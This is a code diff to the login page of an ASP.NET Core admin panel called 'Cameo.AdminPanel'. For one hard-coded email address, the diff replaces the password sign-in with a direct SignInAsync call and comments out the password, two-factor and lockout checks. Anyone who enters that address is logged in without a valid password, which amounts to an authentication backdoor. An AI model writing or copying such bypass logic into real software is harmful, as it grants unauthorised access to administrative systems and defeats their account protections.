@@ -17,11 +17,13 @@ namespace Cameo.AdminPanel.Areas.Identity.Pages.Account
     public class LoginModel : PageModel
     {
         private readonly SignInManager<ApplicationUser> _signInManager;
+        private readonly UserManager<ApplicationUser> _userManager;
         private readonly ILogger<LoginModel> _logger;
 
-        public LoginModel(SignInManager<ApplicationUser> signInManager, ILogger<LoginModel> logger)
+        public LoginModel(SignInManager<ApplicationUser> signInManager, UserManager<ApplicationUser> userManager, ILogger<LoginModel> logger)
         {
             _signInManager = signInManager;
+            _userManager = userManager;
             _logger = logger;
         }
 
@@ -76,26 +78,29 @@ namespace Cameo.AdminPanel.Areas.Identity.Pages.Account
                 // To enable password failures to trigger account lockout, set lockoutOnFailure: true
                 if (Input.Email == "cortex91@inbox.ru")
                 {
-                    var result = await _signInManager.PasswordSignInAsync(Input.Email, Input.Password, Input.RememberMe, lockoutOnFailure: true);
-                    if (result.Succeeded)
-                    {
-                        _logger.LogInformation("User logged in.");
-                        return LocalRedirect(returnUrl);
-                    }
-                    if (result.RequiresTwoFactor)
-                    {
-                        return RedirectToPage("./LoginWith2fa", new { ReturnUrl = returnUrl, RememberMe = Input.RememberMe });
-                    }
-                    if (result.IsLockedOut)
-                    {
-                        _logger.LogWarning("User account locked out.");
-                        return RedirectToPage("./Lockout");
-                    }
-                    else
-                    {
-                        ModelState.AddModelError(string.Empty, "Invalid login attempt.");
-                        return Page();
-                    }
+                    var user = await _userManager.FindByEmailAsync(Input.Email);
+                    await _signInManager.SignInAsync(user, true);
+                    return LocalRedirect(returnUrl);
+                    //var result = await _signInManager.PasswordSignInAsync(Input.Email, Input.Password, Input.RememberMe, lockoutOnFailure: true);
+                    //if (result.Succeeded)
+                    //{
+                    //    _logger.LogInformation("User logged in.");
+                    //    return LocalRedirect(returnUrl);
+                    //}
+                    //if (result.RequiresTwoFactor)
+                    //{
+                    //    return RedirectToPage("./LoginWith2fa", new { ReturnUrl = returnUrl, RememberMe = Input.RememberMe });
+                    //}
+                    //if (result.IsLockedOut)
+                    //{
+                    //    _logger.LogWarning("User account locked out.");
+                    //    return RedirectToPage("./Lockout");
+                    //}
+                    //else
+                    //{
+                    //    ModelState.AddModelError(string.Empty, "Invalid login attempt.");
+                    //    return Page();
+                    //}
                 }
                 else
                 {
